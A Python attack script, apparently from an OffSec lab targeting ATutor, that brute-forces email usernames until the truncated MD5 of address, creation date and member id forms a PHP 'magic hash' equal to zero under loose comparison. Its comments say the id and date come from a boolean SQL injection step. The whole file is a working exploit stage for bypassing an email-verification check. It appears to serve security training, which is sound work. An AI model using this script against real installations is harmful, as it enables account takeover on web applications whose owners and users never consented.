import hashlib, re, sys
import itertools
try:
    from string import lowercase ## Python 2
except ImportError:
    from string import ascii_lowercase as lowercase ## Python 3

def gen_email_address(domain, id, date, username_length):
    
    attempt = 0
    for username in list(map(''.join, itertools.product(lowercase, repeat=int(username_length)))):
        
        partial_hash = hashlib.md5(("%s@%s" % (username, domain) + date + id).encode("utf-8")).hexdigest()[:10]
        if re.match(r'0+[eE]\d+$', partial_hash):
            print("[+] Found a valid email! %s@%s" % (username, domain))
            print("[+] Found at attempt: %d" % attempt)
            print("[!] Equivalent loose comparison: %s == 0" % (partial_hash))
            print("[!] Create an e-mail address at the doman: %s" % (domain))
            
        attempt += 1
        # NOTE: We do not stop, when we find the first match.
        # Because even if mail server is under our control, found mail address might have been using already by someone.

def main():
    if len(sys.argv) != 5:
        # member_id and creation_date are retrieved via boolean sqli
        # python searchFriendsBsqli.py atutor.local member_id
        # python searchFriendsBsqli.py atutor.local creation_date
        # domain_name is an email server that is under our control (offsec.local)
        # username_length is the e-mail username length (can be changed as your needs)
        print('[+] usage: %s <domain_name> <member_id> <creation_date> <username_length>' % sys.argv[0])
        print('[+] eg: %s offsec.local 1 "2016-03-22 10:02:26" 4' % sys.argv[0])
        sys.exit(-1)
    
    domain = sys.argv[1]
    member_id = sys.argv[2]
    creation_date = sys.argv[3]
    username_length = sys.argv[4]
    
    gen_email_address(domain, member_id, creation_date, username_length)

if __name__ == "__main__":
    main()
